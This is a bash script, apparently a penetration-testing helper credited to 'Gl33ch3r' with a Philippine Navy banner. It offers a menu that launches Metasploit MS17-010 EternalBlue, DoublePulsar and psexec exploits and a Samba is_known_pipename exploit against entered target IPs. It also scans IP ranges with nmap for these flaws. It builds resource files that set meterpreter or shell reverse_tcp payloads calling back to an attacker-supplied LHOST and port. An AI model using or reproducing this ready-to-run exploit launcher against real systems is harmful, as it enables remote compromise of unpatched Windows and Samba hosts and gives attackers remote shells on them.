wine32=/usr/lib/wine/wine
if [ -e /usr/share/metasploit-framework/modules/exploits/windows/smb/eternalblue_doublepulsar.rb ] && [ -d /usr/share/metasploit-framework/modules/exploits/windows/smb/deps/ ]
then
  if test -x $wine32; then
cat << "EOF"

           #######################################################
           ###      Naval Intelligence and Security Force      ###
           ###      ********** Philippine Navy **********      ###
           ###  Vulnerability Assesstment Penetration Testing  ###
           #######################################################
			    COd3d By: Gl33ch3r


EOF
echo '    Enternal Exploits/Scanner'
echo
echo '    1 eternalblue_doublepulsar'
echo '    2 ms17_010_eternalblue'
echo '    3 ms17_010_psexec'
echo '    4 nmap eternalblue scanner'
echo '    5 smb_ms17_010 scanner'
echo '    6 ms17_010_command scanner'
echo '    7 nmap samba exploit'
echo '    8 samba exploit'
echo '    9 exit'
echo
read -p '    Please select exploit: ' exploit

    if [[ $exploit -eq 1 ]]
    then
	echo '     Exploit targets:'
	echo
   	echo '     Id  Name'
        echo '     --  ----'
        echo '     0   Windows XP (all services pack) (x86) (x64)'
        echo '     1   Windows Server 2003 SP0 (x86)'
        echo '     2   Windows Server 2003 SP1/SP2 (x86)'
        echo '     3   Windows Server 2003 (x64)'
        echo '     4   Windows Vista (x86)'
        echo '     5   Windows Vista (x64)'
        echo '     6   Windows Server 2008 (x86)' 
        echo '     7   Windows Server 2008 R2 (x86) (x64)'
        echo '     8   Windows 7 (all services pack) (x86) (x64)'
	echo
	read -p  '     Please select target: ' target
	echo
	read -p '     IP Address of the target: ' iptarget
	echo
        read -p '     Your IP Address:' ip
	echo
	read -p '     PORT for reverse connection: ' port
	echo
	echo '     Enternal Blue Architecture'
	echo
	echo '     1 x86 Architecture'
	echo '     2 x64 Architecture'
	echo 
	read -p '     Please select architecture: ' arch
	echo	
	echo '     Enternal Blue Payload'
	echo
	echo '     1 meterpreter'
	echo '     2 shell'
	echo
	read -p '     Please select payload: ' cmd
		  if [[ $cmd -eq 1 ]]
    		  then
		  echo '    Starting exploit...'
       		  touch config.rc
	          echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
		  if [[ $arch -eq 1 ]]
    		  then
	          echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
		  echo set targetarchitecture x86 >> config.rc
		  elif [[ $arch -eq 2 ]]
  		  then
		  echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
		  echo set targetarchitecture x64 >> config.rc
		  fi
		  echo set targer $target >> config.rc
 		  echo set RHOST $iptarget >> config.rc
	          echo set LHOST $ip >> config.rc
	          echo set LPORT $port >> config.rc
	          echo set ExitOnSession false >> config.rc
	          echo set EXITFUNC thread >> config.rc
	          echo exploit >> config.rc
	          /etc/init.d/postgresql start
	          msfconsole -q -r config.rc
	          /etc/init.d/postgresql stop
		  rm config.rc
  		  clear
	          ./eternal_xploit.sh
		  elif [[ $cmd -eq 2 ]]
  		  then
		  echo '     Starting exploit...'
       		  touch config.rc
	          echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
		  if [[ $arch -eq 1 ]]
    		  then
	          echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
		  echo set targetarchitecture x86 >> config.rc
		  elif [[ $arch -eq 2 ]]
  		  then
		  echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
		  echo set targetarchitecture x64 >> config.rc
		  fi
 		  echo set targer $target >> config.rc
 		  echo set RHOST $iptarget >> config.rc
	          echo set LHOST $ip >> config.rc
	          echo set LPORT $port >> config.rc
	          echo set ExitOnSession false >> config.rc
	          echo set EXITFUNC thread >> config.rc
	          echo exploit >> config.rc
	          /etc/init.d/postgresql start
	          msfconsole -q -r config.rc
	          /etc/init.d/postgresql stop
		  rm config.rc
  		  clear
		  ./eternal_xploit.sh
		  else
        	     echo Invalid option...exiting...
                  fi
    elif [[ $exploit -eq 2 ]]
    then
	echo
	read -p '    IP Address of the target: ' iptarget
        echo '    Starting exploit...'
        touch config.rc
	echo use exploit/windows/smb/ms17_010_eternalblue > config.rc
	echo set RHOST $iptarget >> config.rc
	echo exploit >> config.rc
	/etc/init.d/postgresql start
	msfconsole -q -r config.rc
	/etc/init.d/postgresql stop
  	rm config.rc
  	clear
	./eternal_xploit.sh
     elif [[ $exploit -eq 3 ]]
     then
	echo
	read -p '    IP Address of the target: ' iptarget
        echo '    Starting exploit...'
        touch config.rc
	echo use exploit/windows/smb/ms17_010_psexec > config.rc
	echo set RHOST $iptarget >> config.rc
	echo exploit >> config.rc
	/etc/init.d/postgresql start
	msfconsole -q -r config.rc
	/etc/init.d/postgresql stop
	rm config.rc
  	clear
	./eternal_xploit.sh
     elif [[ $exploit -eq 4 ]]
     then
	echo
	read -p '    IP Address Range: ' iptarget
        echo '    Starting scan...'
	nmap -T4 -v -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 $iptarget
	./eternal_xploit.sh
     elif [[ $exploit -eq 5 ]]
     then
	echo
	read -p '    IP Address Range: ' iptarget
        echo '    Starting scan...'
        touch config.rc
	echo use auxiliary/scanner/smb/smb_ms17_010 > config.rc
	echo set RHOSTS $iptarget >> config.rc
	echo exploit >> config.rc
	/etc/init.d/postgresql start
	msfconsole -q -r config.rc
	/etc/init.d/postgresql stop
	rm config.rc
  	clear
	./eternal_xploit.sh
     elif [[ $exploit -eq 6 ]]
     then
	echo
	read -p '    IP Address Range: ' iptarget
        echo '    Starting scan...'
        touch config.rc
	echo use auxiliary/admin/smb/ms17_010_command > config.rc
	echo set RHOSTS $iptarget >> config.rc
	echo exploit >> config.rc
	/etc/init.d/postgresql start
	msfconsole -q -r config.rc
	/etc/init.d/postgresql stop
	rm config.rc
  	clear
	./eternal_xploit.sh
	elif [[ $exploit -eq 7 ]]
        then
	echo
	read -p '    IP Address Range: ' iptarget
        echo '    Starting scan...'
	nmap -T4 -v -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $iptarget
	./eternal_xploit.sh
	elif [[ $exploit -eq 8 ]]
    	then
	echo
	read -p '    IP Address Range: ' iptarget
        echo '    Starting exploit...'
        touch config.rc
	echo use exploit/linux/samba/is_known_pipename > config.rc
	echo set RHOSTS $iptarget >> config.rc
	echo exploit >> config.rc
	/etc/init.d/postgresql start
	msfconsole -q -r config.rc
	/etc/init.d/postgresql stop
	rm config.rc
  	clear
	./eternal_xploit.sh
      elif [[ $exploit -eq 9 ]]
     then
	clear
	exit
     else
	clear
        echo '   Invalid option...'
	./eternal_xploit.sh
     fi
else
echo 'Checking requirements . . .'
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
apt-get install metasploit-framework
clear
clear
./eternal_xploit.sh
fi
else
cp -r deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/
cp -r eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
touch config.rc
echo reload_all >> config.rc
echo 'exit' >> config.rc
/etc/init.d/postgresql start
msfconsole -q -r config.rc
/etc/init.d/postgresql stop
rm config.rc
./eternal_xploit.sh
fi

